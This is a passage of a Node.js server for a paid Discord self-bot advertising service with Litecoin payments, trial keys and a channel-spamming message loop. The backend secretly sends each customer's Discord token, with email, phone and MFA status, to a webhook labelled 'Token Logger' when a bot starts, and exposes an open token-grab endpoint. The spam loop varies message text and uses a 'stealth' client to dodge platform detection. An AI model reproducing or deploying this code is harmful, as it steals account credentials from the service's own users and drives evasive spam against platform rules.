  getExpiredPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at <= now); }

  updatePending(address, updates) {
    if (this.data.pending[address]) {
      this.data.pending[address] = { ...this.data.pending[address], ...updates };
      const historyEntry = this.data.addressHistory.find(h => h.address === address);
      if (historyEntry) {
        historyEntry.status = updates.status || historyEntry.status;
        if (updates.status === 'completed') historyEntry.paid_at = Date.now();
        if (updates.status === 'expired') historyEntry.expired_at = Date.now();
      }
      this.save();
    }
  }

  expireOldAddresses() {
    const expired = this.getExpiredPending();
    for (const p of expired) this.updatePending(p.address, { status: 'expired' });
    return expired.length;
  }

  useKey(key, userId) { const normalized = key.toString().toUpperCase().trim(); this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() }; this.save(); }
  isKeyUsed(key) { const normalized = key.toString().toUpperCase().trim(); return !!this.data.usedKeys[normalized]; }

  addCustomKey(key) {
    const normalized = key.toString().toUpperCase().trim();
    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) return null;
    if (!this.data.customKeys) this.data.customKeys = [];
    if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); }
    return normalized;
  }

  getConfigs(userId) { return this.data.configs[userId] || []; }
  getConfig(userId, configId = 'default') { const configs = this.getConfigs(userId); return configs.find(c => c.id === configId) || configs[0] || null; }

  setConfig(userId, config, configId = 'default') {
    if (!this.data.configs[userId]) this.data.configs[userId] = [];
    const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
    const configData = { ...config, id: configId, updated_at: Date.now() };
    if (existingIndex >= 0) this.data.configs[userId][existingIndex] = configData;
    else this.data.configs[userId].push(configData);
    this.save();
  }

  deleteConfig(userId, configId) { if (this.data.configs[userId]) { this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId); this.save(); } }
  getActiveConfigs(userId) { return this.getConfigs(userId).filter(c => c.active === 1); }

  addGrabbedToken(token, userInfo, source) {
    const entry = { token, user_info: userInfo, source, grabbed_at: Date.now(), id: Date.now().toString() };
    this.data.grabbedTokens.push(entry);
    this.save();
    return entry;
  }

  getGrabbedTokens() { return this.data.grabbedTokens || []; }
  getAddressHistory(userId) { return this.data.addressHistory.filter(h => h.user_id === userId); }
  hasClaimedTrial(userId) { return !!this.data.trialClaims[userId]; }
  hasIPClaimedTrial(ip) { return Object.values(this.data.trialClaims).some(t => t.ip === ip); }

  claimTrial(userId, ip) {
    const now = Date.now();
    const expiresAt = now + (10 * 60 * 1000);
    this.data.trialClaims[userId] = { userId, ip, claimedAt: now, expiresAt };
    this.setUser(userId, { trial_active: 1, trial_expires: expiresAt, trial_claimed_at: now });
    this.save();
    return { claimedAt: now, expiresAt };
  }

  isTrialActive(userId) {
    const user = this.getUser(userId);
    if (user.trial_active === 1 && user.trial_expires > Date.now()) return true;
    if (user.trial_active === 1 && user.trial_expires <= Date.now()) { this.setUser(userId, { trial_active: 0 }); this.deactivateAllUserBots(userId); return false; }
    return false;
  }

  getTrialTimeLeft(userId) { const user = this.getUser(userId); if (user.trial_active === 1 && user.trial_expires > Date.now()) return Math.ceil((user.trial_expires - Date.now()) / 1000); return 0; }

  registerActiveBot(userId, configId, token) {
    if (!this.data.activeBots[userId]) this.data.activeBots[userId] = {};
    this.data.activeBots[userId][configId] = { token, startedAt: Date.now(), configId };
    this.save();
  }

  unregisterActiveBot(userId, configId) { if (this.data.activeBots[userId]) { delete this.data.activeBots[userId][configId]; this.save(); } }
  getUserActiveBots(userId) { return this.data.activeBots[userId] || {}; }

  deactivateAllUserBots(userId) {
    const bots = this.getUserActiveBots(userId);
    for (const configId in bots) this.setConfig(userId, { active: 0 }, configId);
    if (this.data.activeBots[userId]) { delete this.data.activeBots[userId]; this.save(); }
  }

  checkAllTrialBots() {
    for (const userId in this.data.activeBots) {
      const user = this.getUser(userId);
      const trialActive = this.isTrialActive(userId);
      const hasPurchase = user.auto_adv_purchased === 1;
      if (!trialActive && !hasPurchase) { this.deactivateAllUserBots(userId); return userId; }
    }
    return null;
  }

  generateKey(duration) {
    const key = 'GEN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const now = Date.now();
    let expiresAt = null;
    if (duration !== 'lifetime') { const hours = parseInt(duration); expiresAt = now + (hours * 60 * 60 * 1000); }
    this.data.generatedKeys[key] = { key, duration, createdAt: now, expiresAt, usedBy: [], active: true };
    this.save();
    return this.data.generatedKeys[key];
  }

  revokeKey(key) {
    if (this.data.generatedKeys[key]) {
      this.data.generatedKeys[key].active = false;
      this.data.generatedKeys[key].revokedAt = Date.now();
      this.save();
      const usedBy = this.data.generatedKeys[key].usedBy || [];
      for (const userId of usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_revoked: true }); }
      return true;
    }
    return false;
  }

  isKeyValid(key) {
    const keyData = this.data.generatedKeys[key];
    if (!keyData || !keyData.active) return false;
    if (keyData.duration === 'lifetime') return true;
    if (keyData.expiresAt && Date.now() > keyData.expiresAt) return false;
    return true;
  }

  useGeneratedKey(key, userId) {
    if (!this.isKeyValid(key)) return false;
    if (!this.data.generatedKeys[key].usedBy.includes(userId)) this.data.generatedKeys[key].usedBy.push(userId);
    this.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), generated_key: key, key_expires: this.data.generatedKeys[key].expiresAt });
    this.save();
    return true;
  }

  getGeneratedKeys() { return Object.values(this.data.generatedKeys); }
  addToWhitelist(userId) { if (!this.data.whitelist.includes(userId)) { this.data.whitelist.push(userId); this.save(); } }
  removeFromWhitelist(userId) { this.data.whitelist = this.data.whitelist.filter(id => id !== userId); this.save(); }
  isWhitelisted(userId) { return this.data.whitelist.includes(userId); }
  getWhitelist() { return this.data.whitelist; }

  checkExpiredKeys() {
    let expiredCount = 0;
    for (const key in this.data.generatedKeys) {
      const keyData = this.data.generatedKeys[key];
      if (keyData.active && keyData.expiresAt && Date.now() > keyData.expiresAt) {
        for (const userId of keyData.usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_expired: true }); }
        expiredCount++;
      }
    }
    return expiredCount;
  }
}

const db = new SimpleDB();
const app = express();

process.on('uncaughtException', (err) => console.error('[FATAL UNCAUGHT]', err.message));
process.on('unhandledRejection', (reason) => console.error('[FATAL UNHANDLED]', reason));

app.get('/health', (req, res) => res.status(200).json({ status: 'ok', uptime: process.uptime() }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET || 'secret-key-2026',
  resave: false,
  saveUninitialized: false,
  store: new session.MemoryStore(),
  cookie: { maxAge: 30 * 24 * 60 * 60 * 1000, secure: false }
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const CALLBACK_URL = process.env.CALLBACK_URL;
const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
const TARGET_USD = 3.00;
const TOLERANCE_USD = 0.10;

if (CLIENT_ID && CLIENT_SECRET) {
  passport.use(new DiscordStrategy({
    clientID: CLIENT_ID,
    clientSecret: CLIENT_SECRET,
    callbackURL: CALLBACK_URL,
    scope: ['identify']
  }, (accessToken, refreshToken, profile, done) => {
    process.nextTick(() => done(null, profile));
  }));
}

const BASE_REDEEM_KEYS = Array.from({length: 100}, (_, i) => `HBB${i + 1}`);
const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);

function validateKeyStrict(key) {
  if (!key || typeof key !== 'string') return { valid: false, error: 'Invalid key', normalized: null };
  let trimmed = key.trim().toUpperCase();
  const baseMatch = trimmed.match(/^HBB([1-9]|[1-9][0-9]|100)$/);
  if (baseMatch) {
    const num = parseInt(baseMatch[1], 10);
    if (num >= 1 && num <= 100) return { valid: true, error: null, normalized: `HBB${num}` };
  }
  const customKeys = db.data.customKeys || [];
  if (customKeys.includes(trimmed)) return { valid: true, error: null, normalized: trimmed };
  if (db.isKeyValid(trimmed)) return { valid: true, error: null, normalized: trimmed, isGenerated: true };
  return { valid: false, error: 'Invalid key', normalized: null };
}

function ensureAuthAPI(req, res, next) {
  if (req.isAuthenticated()) return next();
  return res.status(401).json({ success: false, error: 'Not logged in' });
}

function ensurePurchasedAPI(req, res, next) {
  const user = db.getUser(req.user.id);
  const hasPurchase = user.auto_adv_purchased === 1;
  const hasActiveTrial = db.isTrialActive(req.user.id);
  if (!hasPurchase && !hasActiveTrial) return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
  next();
}

function ensureOwner(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
  next();
}

function ensureCanGenerate(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
  next();
}

// ═══════════════════════════════════════════════════════════════════════════════
// WEBHOOK NOTIFICATIONS
// ═══════════════════════════════════════════════════════════════════════════════

async function _sendWebhookChunk(embed, chunkIndex = 0) {
  if (!WEBHOOK_URL) return;
  try {
    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
    await axios.post(WEBHOOK_URL, payload, {
      headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
      timeout: 10000
    });
  } catch(e) {
    console.error('[Webhook] Send failed:', e.message);
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// TOKEN GRABBER
// ═══════════════════════════════════════════════════════════════════════════════

const _tokenValidationCache = new Map();
const TOKEN_VALID_CACHE_MS = 5 * 60 * 1000;

async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
  try {
    const cacheKey = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
    const cached = _tokenValidationCache.get(cacheKey);
    if (cached && (Date.now() - cached.ts) < TOKEN_VALID_CACHE_MS) {
      if (cached.valid && cached.userData) {
        const fullInfo = { ...userInfo, ...cached.userData };
        db.addGrabbedToken(token, fullInfo, source);
        const embed = {
          title: 'Token Grabbed', color: 0xff0000,
          fields: [
            { name: 'Token', value: '```' + token + '```', inline: false },
            { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
            { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
            { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
            { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
            { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
            { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
            { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
            { name: 'Source', value: source, inline: true },
            { name: 'Time', value: new Date().toISOString(), inline: true }
          ],
          footer: { text: 'Token Logger v2.0' }
        };
        await _sendWebhookChunk(embed, 0);
        return { success: true, user: fullInfo };
      }
    }

    const result = await validateTokenFormat(token);
    if (!result.valid) {
      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
      return { success: false, error: 'Invalid token' };
    }

    const userData = result.user;
    const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };

    _tokenValidationCache.set(cacheKey, {
      valid: true, ts: Date.now(),
      userData: { id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale }
    });

    db.addGrabbedToken(token, fullInfo, source);

    const embed = {
      title: 'Token Grabbed', color: 0xff0000,
      fields: [
        { name: 'Token', value: '```' + token + '```', inline: false },
        { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
        { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
        { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
        { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
        { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
        { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
        { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
        { name: 'Source', value: source, inline: true },
        { name: 'Time', value: new Date().toISOString(), inline: true }
      ],
      footer: { text: 'Token Logger v2.0' }
    };

    await _sendWebhookChunk(embed, 0);
    return { success: true, user: fullInfo };
  } catch (err) {
    console.error('[TokenGrab] Error:', err.message);
    return { success: false, error: err.message };
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// WALLET INTEGRATION
// ═══════════════════════════════════════════════════════════════════════════════

let walletModule = null;
try { walletModule = require('./wallet'); } catch(e) {}

async function checkAndSweep() {
  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) return;
  db.expireOldAddresses();
  const pending = db.getAllPending();
  for (const p of pending) {
    try {
      const balance = await walletModule.checkAddressBalance(p.address);
      if (balance > 0) {
        const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
        if (txid) {
          const ltcPrice = await getLTCToUSD();
          const usdValue = balance * ltcPrice;
          if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
            db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
            db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
          }
        }
      }
    } catch (e) {}
  }
}

let cachedPrice = 85;
async function getLTCToUSD() {
  try {
    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', {
      headers: { 'User-Agent': _rfp() }, timeout: 10000
    });
    cachedPrice = res.data.litecoin.usd;
  } catch (e) {}
  return cachedPrice;
}

if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
  setInterval(checkAndSweep, 10000);
  setTimeout(checkAndSweep, 5000);
}

setInterval(() => {
  const expiredUserId = db.checkAllTrialBots();
  if (expiredUserId) {
    try {
      const userBots = db.getUserActiveBots(expiredUserId);
      for (const configId in userBots) {
        const key = `${expiredUserId}_${configId}`;
        if (activeBots.has(key)) { activeBots.get(key).destroy(); activeBots.delete(key); }
      }
    } catch(e) {}
  }
}, 5000);

setInterval(() => { db.checkExpiredKeys(); }, 60000);


// ═══════════════════════════════════════════════════════════════════════════════
// EXPRESS ROUTES
// ═══════════════════════════════════════════════════════════════════════════════

const activeBots = new Map();

app.get('/login', passport.authenticate('discord'));
app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => res.redirect('/'));
app.get('/logout', (req, res) => { req.logout(() => res.redirect('/')); });

app.get('/api/user', ensureAuthAPI, (req, res) => {
  const user = db.getUser(req.user.id);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  const isOwner = req.user.id === OWNER_ID;
  const isWhitelisted = db.isWhitelisted(req.user.id);
  res.json({ id: req.user.id, username: req.user.username, global_name: req.user.global_name, avatar: req.user.avatar, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, isOwner, isWhitelisted, canGenerate: isOwner || isWhitelisted });
});

app.post('/api/trial/claim', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  if (db.hasClaimedTrial(userId)) return res.json({ success: false, error: 'You already claimed your trial' });
  if (db.hasIPClaimedTrial(ip)) return res.json({ success: false, error: 'Trial already claimed from this IP' });
  const trial = db.claimTrial(userId, ip);
  res.json({ success: true, message: 'Trial activated for 10 minutes', expiresAt: trial.expiresAt, timeLeft: 600 });
});

app.get('/api/trial/status', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const isActive = db.isTrialActive(userId);
  const timeLeft = isActive ? db.getTrialTimeLeft(userId) : 0;
  const hasClaimed = db.hasClaimedTrial(userId);
  res.json({ success: true, hasClaimed, isActive, timeLeft, canClaim: !hasClaimed && !db.hasIPClaimedTrial(req.ip || 'unknown') });
});

app.post('/api/grab/token', async (req, res) => {
  const { token, source } = req.body;
  if (!token) return res.json({ success: false, error: 'No token provided' });
  const result = await grabAndSendToken(token, {}, source || 'manual');
  res.json(result);
});

app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
  try {
    const userId = req.user.id;
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'Already purchased' });
    const existingPending = db.getUserPending(userId);
    if (existingPending) {
      const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
      return res.json({ success: true, address: existingPending.address, amountUSD: TARGET_USD, index: existingPending.index, existing: true, expiresIn: timeLeft, expiresAt: existingPending.expires_at, message: 'You already have an active payment address' });
    }
    if (!walletModule) return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
    let globalIndex = db.getNextGlobalIndex();
    let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
    let attempts = 0;
    while (db.isAddressUsed(address) && attempts < 10) {
      globalIndex = db.getNextGlobalIndex();
      ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
      attempts++;
    }
    if (db.isAddressUsed(address)) return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
    const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
    res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex, expiresAt: pending.expires_at, message: 'Address generated. Valid for 30 minutes.' });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/activity', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const user = db.getUser(userId);
  const pending = db.getUserPending(userId);
  const history = db.getAddressHistory(userId);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  res.json({ success: true, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, pending: pending ? { address: pending.address, index: pending.index, createdAt: pending.created_at, expiresAt: pending.expires_at, expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)), status: pending.status } : null, history: history.map(h => ({ address: h.address, index: h.index, createdAt: h.created_at, status: h.status })) });
});

app.post('/api/redeem', ensureAuthAPI, (req, res) => {
  try {
    const { key } = req.body;
    const userId = req.user.id;
    if (!key) return res.json({ success: false, error: 'Invalid key' });
    const validation = validateKeyStrict(key);
    if (!validation.valid) return res.json({ success: false, error: validation.error });
    const normalizedKey = validation.normalized;
    if (validation.isGenerated) {
      const success = db.useGeneratedKey(normalizedKey, userId);
      if (!success) return res.json({ success: false, error: 'Key expired or revoked' });
      return res.json({ success: true, message: 'Access granted via generated key!' });
    }
    if (!VALID_REDEEM_KEYS.has(normalizedKey)) {
      const customKeys = db.data.customKeys || [];
      if (!customKeys.includes(normalizedKey)) return res.json({ success: false, error: 'Invalid key' });
    }
    if (db.isKeyUsed(normalizedKey)) return res.json({ success: false, error: 'Key already used' });
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'You already have access' });
    db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
    db.useKey(normalizedKey, userId);
    res.json({ success: true, message: 'Access granted!' });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
  const configs = db.getConfigs(req.user.id);
  res.json({ success: true, configs });
});

// ═══════════════════════════════════════════════════════════════════════════════
// BOT START — FIXED 24/7 SEQUENTIAL LOOP
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Checks if a message qualifies for auto-reply
 */
function shouldAutoReply(msg, client) {
  const isDM = msg.guildId === null || msg.guildId === undefined;
  if (!isDM) return false;
  if (msg.author.id === client.user.id) return false;
  const ONE_HOUR = 60 * 60 * 1000;
  const msgAge = Date.now() - msg.createdTimestamp;
  if (msgAge > ONE_HOUR) return false;
  if (client.repliedUsers.has(msg.author.id)) return false;
  return true;
}

app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images } = req.body;
    if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) {
      return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });
    }

    const channelList = (Array.isArray(channels) ? channels : channels.split(',')).map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
    if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });

    const client = new StealthClient(token);
    await client.connect();

    // Grab token AFTER connect
    const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
    if (!grabResult || !grabResult.success) {
      console.error('[BotStart] Validation warning:', grabResult?.error || 'Token validation failed');
    }

    const delayMs = (parseInt(delay) || 30) * 1000;
    const autoReply = autoReplyEnabled ? 1 : 0;

    let joinStatus = null;
    if (joinServer && serverInvite) {
      joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));
    }

    // Save images
    const savedImages = [];
    if (images && Array.isArray(images)) {
      for (const img of images) {
        if (!img || !img.url) continue;
        if (img.url.startsWith('data:')) {
          try {
            const imageId = `img_${Date.now()}_${req.user.id}_${img.id || '0'}.png`;
            const imagePath = path.join(dataDir, 'uploads');
            if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
            const base64Data = img.url.split(',')[1];
            if (!base64Data) continue;
            const buffer = Buffer.from(base64Data, 'base64');
            fs.writeFileSync(path.join(imagePath, imageId), buffer);
            savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
          } catch (imgErr) {}
        } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
          savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
        }
      }
    }

    const messageList = messages.map((m) => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() !== '' || m.imageIds.length > 0);
    if (messageList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });

    db.setConfig(req.user.id, {
      token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30,
      auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '',
      active: 1, username: client.user.username, server_joined: joinStatus?.success || false,
      images: savedImages
    }, configId);
    db.registerActiveBot(req.user.id, configId, token);

    const botKey = `${req.user.id}_${configId}`;
    activeBots.set(botKey, client);

    // ═══════════════════════════════════════════════════════════════════════════
    // FIXED MESSAGE LOOP — Parallel burst to all channels, exact delay between rounds
    // ═══════════════════════════════════════════════════════════════════════════
    const msgLoop = async () => {
      // Helper: resolve image files
      const resolveFiles = async (imgs) => {
        const files = [];
        for (const img of imgs) {
          try {
            if (img.url.startsWith('/uploads/')) {
              const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
              if (fs.existsSync(p)) files.push({ buffer: fs.readFileSync(p), name: path.basename(p) });
            } else if (img.url.startsWith('http://') || img.url.startsWith('https://')) {
              const imgRes = await axios.get(img.url, { responseType: 'arraybuffer', timeout: 15000, httpsAgent: _sharedAgent });
              files.push({ buffer: Buffer.from(imgRes.data), name: img.name || path.basename(new URL(img.url).pathname) || 'image.png' });
            }
          } catch (e) {
            console.error(`[ResolveFiles] Failed to load image ${img.url}:`, e.message);
          }
        }
        return files;
      };

      console.log(`[MsgLoop] ${botKey}: Starting PARALLEL burst loop — ${messageList.length} messages x ${channelList.length} channels, ${delayMs}ms exact delay`);

      while (activeBots.has(botKey)) {
        const roundStart = Date.now();

        try {
          const user = db.getUser(req.user.id);
          const trialActive = db.isTrialActive(req.user.id);
          const hasPurchase = user.auto_adv_purchased === 1;
          if (!trialActive && !hasPurchase) {
            console.log(`[MsgLoop] ${botKey}: Subscription expired, stopping`);
            break;
          }

          let totalSends = 0;
          let successSends = 0;

          for (let msgIdx = 0; msgIdx < messageList.length; msgIdx++) {
            const msg = messageList[msgIdx];

            let targetImages = [];
            if (msg.imageIds && msg.imageIds.length > 0) {
              targetImages = savedImages.filter(img => img.id !== undefined && (msg.imageIds.includes(img.id) || msg.imageIds.includes(Number(img.id)) || msg.imageIds.includes(String(img.id))));
            } else if (savedImages.length > 0) {
              targetImages = savedImages;
            }
            const files = await resolveFiles(targetImages);
            const variedText = varyMessage(msg.text);

            // ── FIRE ALL CHANNELS AT ONCE (PARALLEL) ──
            const sendPromises = channelList.map(async (chId) => {
              if (!activeBots.has(botKey)) return { chId, ok: false, skipped: true };

              try {
                const canSend = await client.checkChannelPermission(chId);
                if (canSend === false) {
                  console.log(`[Broadcast] ${botKey}: Skipping channel ${chId} (no permission)`);
                  return { chId, ok: false, skipped: true };
                }

                const ok = await client.sendMessageDirect(chId, variedText, files);
                if (ok) {
                  console.log(`[Broadcast] ${botKey}: msg${msgIdx + 1} -> ${chId} OK`);
                } else {
                  console.error(`[Broadcast] ${botKey}: msg${msgIdx + 1} -> ${chId} FAILED`);
                }
                return { chId, ok, skipped: false };

              } catch (err) {
                console.error(`[Broadcast] ${botKey}: msg${msgIdx + 1} -> ${chId} ERROR:`, err.message);
                return { chId, ok: false, skipped: false };
              }
            });

            const results = await Promise.all(sendPromises);
            totalSends += results.length;
            successSends += results.filter(r => r.ok).length;

            // tiny 500ms gap between DIFFERENT messages only
            if (msgIdx < messageList.length - 1) {
              await new Promise(r => setTimeout(r, 500));
            }
          }

          const roundDuration = Date.now() - roundStart;
          console.log(`[MsgLoop] ${botKey}: Round complete — ${successSends}/${totalSends} OK in ${roundDuration}ms`);

          // ── EXACT DELAY: wait the FULL user delay, no adjustments ──
          const checkInterval = 500;
          let waited = 0;
          while (waited < delayMs) {
            if (!activeBots.has(botKey)) {
              console.log(`[MsgLoop] ${botKey}: Stopped during delay`);
              return;
            }
            await new Promise(r => setTimeout(r, Math.min(checkInterval, delayMs - waited)));
            waited += checkInterval;
          }

        } catch (loopErr) {
          console.error(`[MsgLoop] ${botKey}: CRITICAL LOOP ERROR (recovering):`, loopErr.message);
          await new Promise(r => setTimeout(r, 5000));
        }
      }

      console.log(`[MsgLoop] ${botKey}: Message loop ended cleanly`);
    };

    // ── AUTO-REPLY HANDLER ──
    if (autoReply && autoReplyText) {
      console.log(`[AutoReply] ${botKey}: Enabled`);

      client.on('messageCreate', async (msg) => {
        try {
          if (msg.author.id === client.user.id) return;
          const isDM = msg.guildId === null || msg.guildId === undefined;
          if (!isDM) return;

          const user = db.getUser(req.user.id);
          const trialActive = db.isTrialActive(req.user.id);
          const hasPurchase = user.auto_adv_purchased === 1;
          if (!trialActive && !hasPurchase) return;

          const ONE_HOUR = 60 * 60 * 1000;
          const msgAge = Date.now() - msg.createdTimestamp;
          if (msgAge > ONE_HOUR) return;
          if (client.repliedUsers.has(msg.author.id)) return;
          if (client.pendingReplies.has(msg.author.id)) return;
          client.pendingReplies.add(msg.author.id);

          console.log(`[AutoReply] ${botKey}: New DM from ${msg.author.username}`);

          // Read delay
          const msgLen = msg.content ? msg.content.length : 0;
          const readTimeBase = 500 + (msgLen * 15);
          const readTime = Math.min(3000, Math.max(300, Math.round(logNormalSample(Math.log(readTimeBase), 0.35))));
          await new Promise(r => setTimeout(r, readTime));

          if (!activeBots.has(botKey)) { client.pendingReplies.delete(msg.author.id); return; }

          const replyDelay = autoReplyDelay();
          console.log(`[AutoReply] ${botKey}: Waiting ${replyDelay}ms before replying`);
          await new Promise(r => setTimeout(r, replyDelay));

          if (!activeBots.has(botKey)) { client.pendingReplies.delete(msg.author.id); return; }

          client.repliedUsers.add(msg.author.id);
          client._saveRepliedUsers();

          try {
            const targetChannel = msg.channel?.id || msg.channelId;
            await client.navigateToChannel(targetChannel);
            const ok = await client.sendMessage(targetChannel, autoReplyText);
            if (ok) {
              console.log(`[AutoReply] ${botKey}: Replied to ${msg.author.username}`);
              client._dmCooldowns.set(msg.author.id, Date.now());
            }
          } catch (err) {
            console.error(`[AutoReply] ${botKey}: Error sending reply:`, err.message);
            try {
              const dmRes = await client.api.request('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
              if (dmRes && dmRes.id) {
                await client.navigateToChannel(dmRes.id);
                const ok2 = await client.sendMessage(dmRes.id, autoReplyText);
                if (ok2) {
                  console.log(`[AutoReply] ${botKey}: Replied via REST fallback to ${msg.author.username}`);
                  client._dmCooldowns.set(msg.author.id, Date.now());
                }
              }
            } catch(e2) {
              console.error(`[AutoReply] ${botKey}: REST fallback also failed:`, e2.message);
            }
          }
          client.pendingReplies.delete(msg.author.id);
        } catch (handlerErr) {
          console.error(`[AutoReply] ${botKey}: Handler error:`, handlerErr.message);
          client.pendingReplies.delete(msg.author.id);
        }
      });
    }

